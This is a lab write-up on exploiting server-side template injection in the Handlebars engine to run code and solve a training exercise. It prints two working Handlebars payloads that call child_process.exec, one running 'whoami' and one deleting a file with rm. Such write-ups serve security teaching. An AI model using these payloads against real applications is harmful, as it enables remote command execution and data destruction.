# Server-side template injection in an unknown language with a documented exploit
* This lab is vulnerable to server-side template injetion. To solve the lab, identify the template engine and find a documented exploit online that you can use to execute arbitrary code, then delete the `morale.txt` file from Carlos's home directory.

### 1. Enumerate the web page
* From the first product "Giant Pillow Thing", a possibly vulnerable paramter "Message" is found.

![17](https://user-images.githubusercontent.com/53956303/155411885-6310b064-f1b7-4cfd-9f94-a99dfafb4a60.png)
### 2. Test to put a test object
* Put `{{TEST}}` as a test object to value of the "message" parameter.
	* From the result, a Node JS based template engine "Handlebars" error message is given.

![18](https://user-images.githubusercontent.com/53956303/155412174-bb888174-0024-4564-b675-d16f02f7f40f.png)
### 3. Exploit the Handlebars template engine
* From [A Pentetster's Guide to Server side template injection (SSTI) - Cobalt](https://cobalt.io/blog/a-pentesters-guide-to-server-side-template-injection-ssti)] a exploit for Handlebars template engine is found.
```js
wrtz{{#with "s" as |string|}}
{{#with "e"}}
{{#with split as |conslist|}}
{{this.pop}}
{{this.push (lookup string.sub "constructor")}}
{{this.pop}}
{{#with string.split as |codelist|}}
{{this.pop}}
{{this.push "return require('child_process').exec('whoami');"}}
{{this.pop}}
{{#each conslist}}
{{#with (string.sub.apply 0 codelist)}}
{{this}}
{{/with}}
{{/each}}
{{/with}}
{{/with}}
{{/with}}
{{/with}}
```
* modify the script to delete the target file (/home/carlos/morale.txt)
```js
wrtz{{#with "s" as |string|}}
{{#with "e"}}
{{#with split as |conslist|}}
{{this.pop}}
{{this.push (lookup string.sub "constructor")}}
{{this.pop}}
{{#with string.split as |codelist|}}
{{this.pop}}
{{this.push "return require('child_process').exec('rm /home/carlos/morale.txt');"}}
{{this.pop}}
{{#each conslist}}
{{#with (string.sub.apply 0 codelist)}}
{{this}}
{{/with}}
{{/each}}
{{/with}}
{{/with}}
{{/with}}
{{/with}}
```
* Then, on the Burp repeater, URL encode the script to use.

![19](https://user-images.githubusercontent.com/53956303/155414050-0c1e17b0-3d6c-4b10-adbc-64917b3e2ee9.png)
* As a result, the target file is deleted, and the lab is solved.

![20](https://user-images.githubusercontent.com/53956303/155414134-61e8fa4b-5f6a-4d28-a139-7c5c3335c48f.png)
